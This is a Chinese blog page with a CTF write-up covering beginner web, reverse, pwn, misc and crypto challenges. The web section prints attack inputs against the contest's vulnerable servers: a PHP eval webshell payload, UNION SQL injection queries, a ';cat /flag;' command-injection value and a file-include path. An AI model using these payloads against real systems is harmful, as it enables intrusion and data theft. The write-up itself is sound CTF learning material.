@@ -1,0 +1,249 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="author" content="mklkx"><link rel="alternative" href="/atom.xml" title="mklkx" type="application/atom+xml"><link rel="icon" href="/favicon.png"><title>mini_GKCTF - mklkx</title>
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+<!--[if lt IE 9]><script>(function(a,b){a="abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video".split(" ");for(b=a.length-1;b>=0;b--)document.createElement(a[b])})()</script><![endif]-->
+<script src="/js/jquery-3.1.1.min.js"></script>
+
+<script src="/js/fancybox/jquery.fancybox.min.js"></script>
+<meta name="generator" content="Hexo 5.4.0"></head><body style="opacity:0"><header class="head"><h1 class="head-title u-fl"><a href="/">mklkx</a></h1><nav class="head-nav u-fr"><ul class="head-nav__list"><li class="head-nav__item"><a class="head-nav__link" href="/tags">标签</a></li><li class="head-nav__item"><a class="head-nav__link" href="/archives">目录</a></li></ul></nav></header><main class="main"><article class="post"><header class="post__head"><time class="post__time" datetime="2020-09-15T13:58:02.000Z">2020 - 09 - 15 21:58:02</time><h1 class="post__title"><a href="/2020/09/15/mini-GKCTF/">mini_GKCTF</a></h1><div class="post__main echo"><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a><strong>写在前面</strong></h3><blockquote>
+<p>浅薄笔者经过几个月的学习，misc和crypto的部分算是有所收获，web和re还不能算是入门，以此篇记录此前一次小比赛。并在10月19日，比赛正式开始后进行一次加更。</p>
+</blockquote>
+<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><blockquote>
+<p><img src="https://s3.ax1x.com/2020/12/05/DLPSdx.png" alt="签到"></p>
+</blockquote>
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a><em>web</em></h3><h4 id="毕业设计"><a href="#毕业设计" class="headerlink" title="毕业设计"></a><a target="_blank" rel="noopener" href="http://172.17.135.14:8001/">毕业设计</a></h4><blockquote>
+<p>才刚进校园就想做毕设了，你这也太深谋远虑了嗷，先看看憨憨学长的毕设算了：毕设首页</p>
+</blockquote>
+<p>curl + u查看源码</p>
+<p><img src="https://s3.ax1x.com/2020/12/05/DLCbJU.png" alt="web1"></p>
+<h4 id="毕业设计-v2-0"><a href="#毕业设计-v2-0" class="headerlink" title="毕业设计:v2.0"></a><a target="_blank" rel="noopener" href="http://172.17.135.14:8002/">毕业设计:v2.0</a></h4><blockquote>
+<p>后来，憨憨学长恼羞成怒再次修改了自己的毕设首页：毕设首页</p>
+</blockquote>
+<p>同上题，查看源码后进入<a target="_blank" rel="noopener" href="http://172.17.135.14:8002/images/highlight.flag.js%EF%BC%8C%E5%BE%97%E5%88%B0flag">http://172.17.135.14:8002/images/highlight.flag.js，得到flag</a>.</p>
+<p><img src="https://s3.ax1x.com/2020/12/05/DLCHiT.jpg" alt="web2"></p>
+<h4 id="第一个PHP"><a href="#第一个PHP" class="headerlink" title="第一个PHP"></a><a target="_blank" rel="noopener" href="http://172.17.135.14:8003/">第一个PHP</a></h4><blockquote>
+<p>PHP一定是世界上最好的语言！</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__File__);</span><br><span class="line">$Ginkgo&#x3D;$_GET[&quot;Ginkgo&quot;];</span><br><span class="line">$Vigorous&#x3D;$_GET[&quot;Vigorous&quot;];</span><br><span class="line">if ($Ginkgo &#x3D;&#x3D; &quot;Mini_Ginkgo_Wonderful&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        print(&quot;好！冲冲冲~！&quot;);</span><br><span class="line">        if($Vigorous &#x3D;&#x3D; &quot;N1D1W4Dul&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                system(&quot;cat &#x2F;flag.txt&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">else</span><br><span class="line">    &#123;</span><br><span class="line">        print(&quot;别把别把别把&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>get传参得flag。<br><img src="https://s3.ax1x.com/2020/12/05/DLCjy9.png" alt="web3"></p>
+<h4 id="一个朴实无华的小游戏"><a href="#一个朴实无华的小游戏" class="headerlink" title="一个朴实无华的小游戏"></a><a target="_blank" rel="noopener" href="http://172.17.135.14:8016/">一个朴实无华的小游戏</a></h4><blockquote>
+<p>在那个晚上，有一个男人，叫w4nder，他看带🔥们都打累了，给大家整点有趣的游戏，通关就得flag~ 题目链接</p>
+</blockquote>
+<p>玩游戏得flag</p>
+<h4 id="第一个木马文件"><a href="#第一个木马文件" class="headerlink" title="第一个木马文件"></a><a target="_blank" rel="noopener" href="http://172.17.135.14:8004/">第一个木马文件</a></h4><blockquote>
+<p>Ginkgo的易烊千玺说他最喜欢的就是flag和木马了，现在他都给你了：题目链接</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__File__);</span><br><span class="line">&#x2F;&#x2F;你知道什么是一句话木马🐎？</span><br><span class="line">$W4nder&#x3D;$_POST[&quot;W4nder&quot;];</span><br><span class="line">$Webshell&#x3D;$_POST[&quot;Webshell&quot;];</span><br><span class="line">if ($W4nder &#x3D;&#x3D; &quot;THE_Jackson_Yi_0F_G1nkgo&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        print(&quot;啊这，这你都知道&quot;);</span><br><span class="line">        eval($Webshell);</span><br><span class="line">    &#125;</span><br><span class="line">else</span><br><span class="line">    &#123;</span><br><span class="line">        print(&quot;爬&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>POST传参</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">W4nder&#x3D;THE_Jackson_Yi_0F_G1nkgo&amp;Webshell&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>得flag.</p>
+<h4 id="你就是“du”怪"><a href="#你就是“du”怪" class="headerlink" title="你就是“du”怪?"></a><a target="_blank" rel="noopener" href="http://172.17.135.14:8005/">你就是“du”怪?</a></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__File__);</span><br><span class="line">&#x2F;&#x2F;我把flag放在根目录下啦，是linux系统嗷</span><br><span class="line">$file&#x3D;$_GET[&quot;file&quot;];</span><br><span class="line">$number&#x3D;$_GET[&quot;number&quot;];</span><br><span class="line">$number1&#x3D;rand(3,44);</span><br><span class="line">echo $number1;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">if($number &#x3D;&#x3D; $number1)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;我丢，你是赌怪🐎?&quot;;</span><br><span class="line">        include($file);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;玩游戏,我最喜欢梭哈了&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>考察了GET传参和文件包含，输入命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?number&#x3D;3&amp;file&#x3D;&#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<p>number为3到44之间的随机数，可以任意输入，接下来就是看运气了😂</p>
+<h4 id="简单的注入"><a href="#简单的注入" class="headerlink" title="简单的注入"></a><a target="_blank" rel="noopener" href="http://123.57.240.205:6001/">简单的注入</a></h4><p>本题为CTFHUB中Web-Web前置技能-SQL注入中字符型注入的类似题。先回顾了一遍原题，比较后发现两题在注入过程中仅引号部分有区别.</p>
+<p>整理思路</p>
+<ul>
+<li>数据库名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;123&#39; union select database(),2 #&#39;</span><br></pre></td></tr></table></figure>
+
+<p>得数据库名easy_sql</p>
+<ul>
+<li>表名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;123&#39; union select group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;easy_sql&#39; #&#39;</span><br></pre></td></tr></table></figure>
+
+<p>得存在两个表flag,users</p>
+<ul>
+<li>字段名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;123&#39; union select group_concat(column_name) ,3 from information_schema.columns where table_name&#x3D;&#39;flag&#39; #&#39;</span><br></pre></td></tr></table></figure>
+
+<p>得字段名flag</p>
+<ul>
+<li>获取flag</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;123&#39; union select flag,3 from easy_sql.flag #&#39;</span><br></pre></td></tr></table></figure>
+
+<h4 id="💧JSBUG💧"><a href="#💧JSBUG💧" class="headerlink" title="[💧JSBUG💧]"></a>[💧JSBUG💧]</h4><blockquote>
+<p>💧得得是一个爱老婆的男人，有一天他的爱人被😈抓走了， 💧得得为了拯救老婆，决定穿上铠甲，踏上拯救老婆的道路， 💧得得遇到了第一个怪物就是史莱姆，💧得得觉得🔪太慢了，想另辟蹊径 你能帮他想想办法吗？题目链接</p>
+</blockquote>
+<p><img src="https://s3.ax1x.com/2020/12/05/DLCze1.jpg" alt="web8"></p>
+<p>已知经验值应该达到10000，而每次只能打1-9只史莱姆，通过更改源码中maxlength=1为maxlength=100000等，回车后直接练级，挑战，得flag。</p>
+<h4 id="文件查询系统"><a href="#文件查询系统" class="headerlink" title="文件查询系统"></a><a target="_blank" rel="noopener" href="http://172.17.135.14:8006/">文件查询系统</a></h4><p>页面提示备份文件，dirsearch扫描后发现存在<a target="_blank" rel="noopener" href="http://www.zip,下载后得到网页源码/">www.zip，下载后得到网页源码</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		$key &#x3D; $_REQUEST[&quot;Ginkgo&quot;];</span><br><span class="line">		if($key !&#x3D; &quot;&quot;) </span><br><span class="line">		&#123;</span><br><span class="line">			$ccc&#x3D;passthru(&quot;grep -i $key fl.txt&quot;);</span><br><span class="line">			print_r($ccc);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">				echo &quot;多想想备份文件&quot;;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>简单的PHP代码，不过在应该给Ginkgo(key)赋什么值却让我犯了难。查询了grep命令，尝试Ginkgo=flag,也只得到满屏的假flag。</p>
+<p>后学到了隔离（或许不叫这个名），得知应该输入的值为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ginkgo&#x3D;;cat &#x2F;flag;</span><br></pre></td></tr></table></figure>
+
+<p>完整命令就变成了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -i ; cat &#x2F;flag; f1.txt</span><br></pre></td></tr></table></figure>
+
+<p>关键点就在于这几个“；”，使得整个命令只留下了我们想要的”cat /flag;”</p>
+<h4 id="😀👊的爱情故事"><a href="#😀👊的爱情故事" class="headerlink" title="[😀👊的爱情故事]"></a>[😀👊的爱情故事]</h4><blockquote>
+<p>一段惊心动魄的爱情天🐕故事。<a target="_blank" rel="noopener" href="http://172.17.135.14:8010/">题目链接</a></p>
+</blockquote>
+<p>机器人协议，搜索/robots.txt文件，得</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Disallow:&#x2F;i_love_robot.php</span><br></pre></td></tr></table></figure>
+
+<p>跳转到/i_love_robot.php，得到一个新的后台管理页面，根据首页文字提示，已知密码为20190821，那账号是什么呢</p>
+<p>盲猜admin，对了🙂</p>
+<h3 id="re"><a href="#re" class="headerlink" title="re"></a><em>re</em></h3><h4 id="GKdoor"><a href="#GKdoor" class="headerlink" title="[GKdoor]"></a>[GKdoor]</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public boolean checkPassword(String password) &#123;</span><br><span class="line">        return password.length() &#x3D;&#x3D; 32 &amp;&amp;</span><br><span class="line">        password.charAt(26)  &#x3D;&#x3D; &#39;7&#39; &amp;&amp;</span><br><span class="line">        password.charAt(20)  &#x3D;&#x3D; &#39;7&#39; &amp;&amp;</span><br><span class="line">        password.charAt(39)  &#x3D;&#x3D; &#39;2&#39; &amp;&amp;</span><br><span class="line">        password.charAt(3)  &#x3D;&#x3D; &#39;8&#39; &amp;&amp;</span><br><span class="line">        password.charAt(15)  &#x3D;&#x3D; &#39;9&#39; &amp;&amp;</span><br><span class="line">        password.charAt(8)  &#x3D;&#x3D; &#39;6&#39; &amp;&amp;</span><br><span class="line">        password.charAt(23)  &#x3D;&#x3D; &#39;f&#39; &amp;&amp;</span><br><span class="line">        password.charAt(4)  &#x3D;&#x3D; &#39;6&#39; &amp;&amp;</span><br><span class="line">        password.charAt(5)  &#x3D;&#x3D; &#39;5&#39; &amp;&amp;</span><br><span class="line">        password.charAt(30)  &#x3D;&#x3D; &#39;e&#39; &amp;&amp;</span><br><span class="line">        password.charAt(31)  &#x3D;&#x3D; &#39;2&#39; &amp;&amp;</span><br><span class="line">        password.charAt(32)  &#x3D;&#x3D; &#39;8&#39; &amp;&amp;</span><br><span class="line">        password.charAt(33)  &#x3D;&#x3D; &#39;a&#39; &amp;&amp;</span><br><span class="line">        password.charAt(34)  &#x3D;&#x3D; &#39;9&#39; &amp;&amp;</span><br><span class="line">        password.charAt(41)  &#x3D;&#x3D; &#39;a&#39; &amp;&amp;</span><br><span class="line">        password.charAt(10)  &#x3D;&#x3D; &#39;7&#39; &amp;&amp;</span><br><span class="line">        password.charAt(11)  &#x3D;&#x3D; &#39;9&#39; &amp;&amp;</span><br><span class="line">        password.charAt(12)  &#x3D;&#x3D; &#39;2&#39; &amp;&amp;</span><br><span class="line">        password.charAt(1)  &#x3D;&#x3D; &#39;3&#39; &amp;&amp;</span><br><span class="line">        password.charAt(19)  &#x3D;&#x3D; &#39;0&#39; &amp;&amp;</span><br><span class="line">        password.charAt(42)  &#x3D;&#x3D; &#39;9&#39; &amp;&amp;</span><br><span class="line">        password.charAt(43)  &#x3D;&#x3D; &#39;9&#39; &amp;&amp;</span><br><span class="line">        password.charAt(13)  &#x3D;&#x3D; &#39;0&#39; &amp;&amp;</span><br><span class="line">        password.charAt(14)  &#x3D;&#x3D; &#39;6&#39; &amp;&amp;</span><br><span class="line">        password.charAt(17)  &#x3D;&#x3D; &#39;3&#39; &amp;&amp;</span><br><span class="line">        password.charAt(18)  &#x3D;&#x3D; &#39;2&#39; &amp;&amp;</span><br><span class="line">        password.charAt(21)  &#x3D;&#x3D; &#39;7&#39; &amp;&amp;</span><br><span class="line">        password.charAt(22)  &#x3D;&#x3D; &#39;6&#39; &amp;&amp;</span><br><span class="line">        password.charAt(2)  &#x3D;&#x3D; &#39;6&#39; &amp;&amp;</span><br><span class="line">        password.charAt(27)  &#x3D;&#x3D; &#39;e&#39; &amp;&amp;</span><br><span class="line">        password.charAt(28)  &#x3D;&#x3D; &#39;2&#39; &amp;&amp;</span><br><span class="line">        password.charAt(7)  &#x3D;&#x3D; &#39;e&#39; &amp;&amp;</span><br><span class="line">        password.charAt(37)  &#x3D;&#x3D; &#39;f&#39; &amp;&amp;</span><br><span class="line">        password.charAt(16)  &#x3D;&#x3D; &#39;7&#39; &amp;&amp;</span><br><span class="line">        password.charAt(6)  &#x3D;&#x3D; &#39;6&#39; &amp;&amp;</span><br><span class="line">        password.charAt(24)  &#x3D;&#x3D; &#39;7&#39; &amp;&amp;</span><br><span class="line">        password.charAt(25)  &#x3D;&#x3D; &#39;7&#39; &amp;&amp;</span><br><span class="line">        password.charAt(0)  &#x3D;&#x3D; &#39;4&#39; &amp;&amp;</span><br><span class="line">        password.charAt(40)  &#x3D;&#x3D; &#39;8&#39; &amp;&amp;</span><br><span class="line">        password.charAt(29)  &#x3D;&#x3D; &#39;0&#39; &amp;&amp;</span><br><span class="line">        password.charAt(35)  &#x3D;&#x3D; &#39;9&#39; &amp;&amp;</span><br><span class="line">        password.charAt(36)  &#x3D;&#x3D; &#39;6&#39; &amp;&amp;</span><br><span class="line">        password.charAt(38)  &#x3D;&#x3D; &#39;e&#39; &amp;&amp;</span><br><span class="line">        password.charAt(9)  &#x3D;&#x3D; &#39;5&#39; &amp;&amp;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据下标转十六进制即可</p>
+<h4 id="CheckPlus"><a href="#CheckPlus" class="headerlink" title="[CheckPlus]"></a>[CheckPlus]</h4><blockquote>
+<p>你能找到是什么加密🐎</p>
+</blockquote>
+<p>拖入IDA，找到可疑字符串</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ZmxhZ3tOb3dZb3VMZWFybmVkUmV2ZXJzZX0&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>base64解密得flag.</p>
+<h4 id="2048"><a href="#2048" class="headerlink" title="[2048]"></a>[2048]</h4><p>玩游戏得flag</p>
+<h4 id="assembly"><a href="#assembly" class="headerlink" title="[assembly]"></a>[assembly]</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0070210C: 66 6c 61 67 7b 61 73 6d 69 73 66 75 6e 7d</span><br></pre></td></tr></table></figure>
+
+<p>十六进制转字符</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f l a g &#123; a s m i s f u n &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a><em>pwn</em></h3><h4 id="easy-nc"><a href="#easy-nc" class="headerlink" title="[easy_nc]"></a>[easy_nc]</h4><blockquote>
+<p>(netcat是啥？网络猫？ 王队大姐姐：好！冲冲冲！nc 39.105.231.146 8013)</p>
+</blockquote>
+<p>nc直接得flag</p>
+<h4 id="hard-pwn"><a href="#hard-pwn" class="headerlink" title="[hard_pwn]"></a>[hard_pwn]</h4><blockquote>
+<p>(所有题目统一的libc库嗷这道题目可能是最难的pwn题目嗷39.105.231.146:8002)</p>
+</blockquote>
+<p>没有回显，奇怪，随便输了点东西，有返回。输入cat flag。得。</p>
+<h4 id="🍑姐姐的PWN学习之路"><a href="#🍑姐姐的PWN学习之路" class="headerlink" title="[🍑姐姐的PWN学习之路]"></a>[🍑姐姐的PWN学习之路]</h4><blockquote>
+<p>🍑姐姐学习pwn已经五天了，她终于学到了数组越界。<br>有一天，一个男的突然加了🍑姐姐，主动发消息要追求🍑姐姐，<br>🍑姐姐鼓鼓嘴，怎么可能这么容易就追到了呢，<br>先学会数组越界再说吧！<br>（听说这是专门給luoluo姐设置的flag嗷）<br>39.105.231.146:8003</p>
+</blockquote>
+<p>随便输入多个字符，发现</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ooooooooooooooooooooooooooooooools</span><br><span class="line">b&#x3D;&gt;ls</span><br></pre></td></tr></table></figure>
+
+<p>但仍然没有反应，打开附件，观察</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">puts(&quot;please pwn me!!!&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, &amp;buf, 0x100uLL);</span><br><span class="line">    if ( (_BYTE)v13 &#x3D;&#x3D; 99 &amp;&amp; BYTE1(v13) &#x3D;&#x3D; 100 &amp;&amp; v21 &#x3D;&#x3D; 97 &amp;&amp; HIBYTE(v8) &#x3D;&#x3D; 102 &amp;&amp; BYTE3(v6) &#x3D;&#x3D; 119 )</span><br><span class="line">      break;</span><br><span class="line">    printf(&quot;b&#x3D;&gt;%s\n&quot;, &amp;v13, buf, v5, v6);</span><br><span class="line">    puts(&quot;you need &#39; b&#x3D;&gt;cd &#39; &quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;tql&quot;, &amp;buf, buf, v5, v6, v7, v8, v9, v10, v11, *(_QWORD *)&amp;v12);</span><br><span class="line">  system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">  return 0;</span><br></pre></td></tr></table></figure>
+
+<p>(或根据题干，也可得知应传入cd（等）)，可得flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I need b&#x3D;&gt;cd</span><br><span class="line">oooooooooooooooooooooooooooooooocdef2                                                       </span><br><span class="line">tql</span><br><span class="line"></span><br><span class="line">flag</span><br><span class="line">&#x2F;bin&#x2F;sh: 3: flag: not found</span><br><span class="line">cat &#x2F;flag</span><br><span class="line">flag&#123;luoluo_is_so_beatiuful&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a><em>misc</em></h3><h4 id="有手就行"><a href="#有手就行" class="headerlink" title="有手就行"></a><strong>有手就行</strong></h4><blockquote>
+<p>[有手就行]<br>水平翻转得flag</p>
+</blockquote>
+<h4 id="真实的压缩包"><a href="#真实的压缩包" class="headerlink" title="真实的压缩包"></a><strong>真实的压缩包</strong></h4><blockquote>
+<p>[真实的压缩包]</p>
+<p><img src="https://s3.ax1x.com/2020/12/05/DLERzT.png" alt="真实的压缩包1"></p>
+</blockquote>
+<h4 id="虚假的压缩包"><a href="#虚假的压缩包" class="headerlink" title="虚假的压缩包"></a><strong>虚假的压缩包</strong></h4><blockquote>
+<p>[虚假的压缩包]</p>
+<p><img src="https://s3.ax1x.com/2020/12/05/DLCvLR.png" alt="虚假的压缩包1"><br><img src="https://s3.ax1x.com/2020/12/05/DLPCFK.png" alt="虚假的压缩包2"><br><img src="https://s3.ax1x.com/2020/12/05/DLEfQU.png" alt="虚假的压缩包3"></p>
+</blockquote>
+<h4 id="有眼就行"><a href="#有眼就行" class="headerlink" title="有眼就行"></a><strong>有眼就行</strong></h4><blockquote>
+<p>[有眼就行]</p>
+<p><img src="https://s3.ax1x.com/2020/12/05/DLm491.png" alt="有眼就行"></p>
+</blockquote>
+<h4 id="追踪他的密码"><a href="#追踪他的密码" class="headerlink" title="追踪他的密码"></a><strong>追踪他的密码</strong></h4><blockquote>
+<p>[追踪他的密码]</p>
+<p><img src="https://s3.ax1x.com/2020/12/05/DLE2WV.png" alt="追踪他的密码"></p>
+</blockquote>
+<h4 id="hello-hex"><a href="#hello-hex" class="headerlink" title="hello hex"></a><strong>hello hex</strong></h4><blockquote>
+<p>[hello hex1]</p>
+<p><img src="https://s3.ax1x.com/2020/12/05/DLCXQJ.png" alt="hello hex1"><br><img src="https://s3.ax1x.com/2020/12/05/DLCqWF.png" alt="hello hex2"></p>
+</blockquote>
+<h4 id="baby流量分析"><a href="#baby流量分析" class="headerlink" title="baby流量分析"></a><strong>baby流量分析</strong></h4><blockquote>
+<p>[baby流量分析]</p>
+</blockquote>
+<p><img src="https://s3.ax1x.com/2020/12/05/DLCLz4.png" alt="baby流量分析"></p>
+<h4 id="郭哥的mimi"><a href="#郭哥的mimi" class="headerlink" title="郭哥的mimi"></a><strong>郭哥的mimi</strong></h4><blockquote>
+<p>[郭哥的mimi]</p>
+<blockquote>
+<p>半夜三点，郭哥得知赌神已到，忍不住赌瘾大发，和赌神在赌场中疯狂梭哈，结果把flag掉到赌场里，被🍊⭐哥抓个正着，现在🍊⭐哥把郭哥的流量监控发出来了，不知道你能找到flag吗</p>
+</blockquote>
+</blockquote>
+<p>丢尽wireshark里找了半天，终于找到一个POST传参的流量，打开得flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#x3D;flag%7B02051125340512_Ginkgo%7D</span><br></pre></td></tr></table></figure>
+
+<p>URL解码后得正确flag。</p>
+<h4 id="PixelJihad"><a href="#PixelJihad" class="headerlink" title="PixelJihad"></a><strong>PixelJihad</strong></h4><blockquote>
+<p>[PixelJihad]</p>
+<blockquote>
+<p>你需要一双善于发现的眼睛，和一个善于发现的脑子，更需要一对善于发现的手，这是你与生俱来的优势，发现图片里隐藏的信息吧！</p>
+</blockquote>
+</blockquote>
+<p>搜索文字题目，得<a target="_blank" rel="noopener" href="https://sekao.net/pixeljihad/">在线网站</a></p>
+<p>需要密码。既然是图片，拖进winhex里找找叭，文件尾有发现：Y3RmaXNmdW4=</p>
+<p>base64解密后得ctfisfun。</p>
+<p>两者结合，得flag.</p>
+<h4 id="阿巴阿巴"><a href="#阿巴阿巴" class="headerlink" title="阿巴阿巴"></a><strong>阿巴阿巴</strong></h4><blockquote>
+<p>[阿巴阿巴]</p>
+</blockquote>
+<p>emmm没啥好说的，动图分离就得到一张郭哥的表情包hhh</p>
+<h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a><em>crypto</em></h3><h4 id="crypto1"><a href="#crypto1" class="headerlink" title="crypto1"></a><strong>crypto1</strong></h4><h4 id="注入哥的爱情回执"><a href="#注入哥的爱情回执" class="headerlink" title="[注入哥的爱情回执]"></a>[注入哥的爱情回执]</h4><blockquote>
+<p>注入哥给喜欢的女孩表白了！<br>女孩害羞地说<br>“ -.–/…/.-../.—-/–../..–.-/-.–/—–/..-/..–.-/.-/.-./….-/..–.-/.-/-./..–.-/–./—–/—–/-../..–.-/–./.-/-.–”，<br>注入哥不知道是什么意思，懊恼极了，你能帮助他吗？<br>提交为flag{*}</p>
+</blockquote>
+<p>摩斯电码解密</p>
+<h4 id="莱×🌂兄弟"><a href="#莱×🌂兄弟" class="headerlink" title="[莱×🌂兄弟]"></a>[莱×🌂兄弟]</h4><blockquote>
+<p>luoluo说：<br>“S19aMHhzX28xem1tX3ZzYyE=”<br>轩成哥还说：“coco”<br>不会吧不会吧，不会有人不知道这是什么意思吧。</p>
+</blockquote>
+<p>base64解密+以coco为密钥的维吉尼亚</p>
+<h4 id="中华文化"><a href="#中华文化" class="headerlink" title="[中华文化]"></a>[中华文化]</h4><blockquote>
+<p>中文电码<br>00225478242905530590112947373234</p>
+</blockquote>
+<p>中文电码解密</p>
+<h4 id="文化人"><a href="#文化人" class="headerlink" title="[文化人]"></a>[文化人]</h4><blockquote>
+<p>新佛曰：心即是是聞莊修如聞愍亦嚤是莊摩婆塞阿念般宣是怖訶須是薩慧怖阿是色諦聞若叻羅缽菩般若斯嘇咤怖寂修般吶修訶願嚴怖訶宣宣吽寂我彌怖色如諸如諸彌伏亦菩般斯婆菩伏諦斯兜羅阿般降蜜菩劫念隸所怖摩心如陀咒菩訶缽諸慧菩陀薩諦囉心薩般嘚怖塞喃陀亦尊怖愍咒隸心諸宣僧怖缽咤願咒亦諸斯喃嘇寂愍諸叻尊迦喃祗怖隸夷祗訶怖咒般吶蜜僧隸伏阿哆祗迦聞須斯聞嚩如嘚兜須即陀吽嚤如宣羅兜降降婆哆夷蜜怖耨嚴伏諸隸彌耨若兜我怖陀嘚婆哆慧所怖莊隸即諦修訶薩怖嚩兜菩迦宣諦哆怖如如囑囑</p>
+</blockquote>
+<p>新佛曰得：</p>
+<p>公正公正公正民主和谐文明和谐民主公正公正公正自由和谐法治公正自由文明友善法治和谐富强和谐法治和谐法治和谐文明文明诚信和谐和谐自由公正自由和谐民主和谐自由文明诚信和谐和谐爱国和谐公正公正民主和谐平等文明诚信和谐和谐自由公正平等公正平等公正自由和谐爱国公正文明公正民主和谐敬业和谐和谐和谐和谐公正和谐和谐敬业</p>
+<p>社会主义核心价值观解密得flag.</p>
+<h4 id="天干地支"><a href="#天干地支" class="headerlink" title="[天干地支]"></a>[天干地支]</h4><p>天干地支加甲子(X+60)转ASCII得flag</p>
+<h4 id="Biometric-list"><a href="#Biometric-list" class="headerlink" title="[Biometric list]"></a>[Biometric list]</h4><blockquote>
+<p>我在一片插有石碑的海滩上醒来，背后是幽深的海，抬头是晨光和高山，我飞过蓝色的石台，蝴蝶围绕，冲天而起，石碑前的先祖告诉我，你需要一个Biometric list来获取漂亮的flag。</p>
+</blockquote>
+<p>该题与前不久遇到的一道题类似，生物特征列表（PGP），通过搜索附件中的关键词可得到提示，转16进制后得flag</p>
+<h4 id="魏✌呐和阿①爱丝"><a href="#魏✌呐和阿①爱丝" class="headerlink" title="[魏✌呐和阿①爱丝]"></a>[魏✌呐和阿①爱丝]</h4><blockquote>
+<p>江水哥说你只要解出这个题，他就带你去浪漫Vienna<br>M：U2FsdGVkX18S8k9WSjCOYu7omOyRJYSWvopJOt3m4aJ7n+RjtsfKg3bvWuD3wk/U</p>
+</blockquote>
+<p>阿①爱丝谐音AES,在线网站解密</p>
+<h4 id="啪嗒啪嗒啪嗒"><a href="#啪嗒啪嗒啪嗒" class="headerlink" title="[啪嗒啪嗒啪嗒]"></a>[啪嗒啪嗒啪嗒]</h4><blockquote>
+<p>我看见小矮人们手拉手拨弹竖琴，<br>我看见大高个们在树洞下烤螃蟹，<br>我还点亮了很多旅人，<br>却只能看到他们飞离的尾羽，<br>我不想再做孤狼，<br>我想认识新朋友！<br>于是低下头看着键盘，敲打着：<br>“31 91 34 31 33 61 61 13 94 51 34 51 81 94 41 21 61 91 94 54 32 81 32 94 11 71 32 31 13 34 33 51 21 43 71 34”<br>这是我可爱的小键盘~<br>1 2 3 4 5 6 7 8 9<br>q w e r t y u i o<br>a s d f g h j k l<br>z x c v b n m p -<br>（得到的明文带上flag{}包裹提交）</p>
+</blockquote>
+<p>对应即可</p>
+<h4 id="王可可大讲堂"><a href="#王可可大讲堂" class="headerlink" title="[王可可大讲堂]"></a>[王可可大讲堂]</h4><blockquote>
+<p>王可可老师：<br>“1977年，Ron Rivest、Adi Shamir、Leonard Adleman<br>三个老哥提出了一种加密算法，你知道是什么吗？”</p>
+</blockquote>
